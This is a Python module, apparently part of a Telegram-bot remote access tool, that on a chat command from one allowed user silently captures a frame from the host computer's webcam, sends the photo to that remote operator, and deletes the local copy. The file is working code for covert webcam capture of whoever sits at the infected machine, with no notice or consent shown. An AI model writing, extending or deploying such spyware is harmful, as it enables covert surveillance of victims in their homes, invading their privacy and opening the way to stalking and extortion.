##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


import os
import cv2
from aiogram import types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile

from config import ALLOWED_USER_ID, directory

def register_snapshot_handlers(dp):
    @dp.message(F.text.lower() == "фото с камеры")
    @dp.message(Command("snapshot"))
    async def send_photo(message: types.Message):
        if message.from_user.id == ALLOWED_USER_ID:
            await message.answer('Сейчас будет, root')
            filename = "snapshot.png"
            filepath = os.path.join(directory, filename)

            try:
                camera = cv2.VideoCapture(0)
                if not camera.isOpened():
                    raise RuntimeError("Не удалось открыть камеру, возможно она занята другим процессом.")

                ret, frame = camera.read()
                if not ret:
                    raise RuntimeError("Не удалось сделать снимок, возможно камера занята другим процессом.")

                cv2.imwrite(filepath, frame)
                photo = FSInputFile(filepath)
                await message.answer_photo(photo, caption="Вот ваше фото с веб-камеры, root")

            except Exception as e:
                await message.answer(f"Произошла ошибка при попытке сделать фото: {e}")

            finally:
                if 'camera' in locals() and camera.isOpened():
                    camera.release()

                if os.path.exists(filepath):
                    os.remove(filepath)

        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")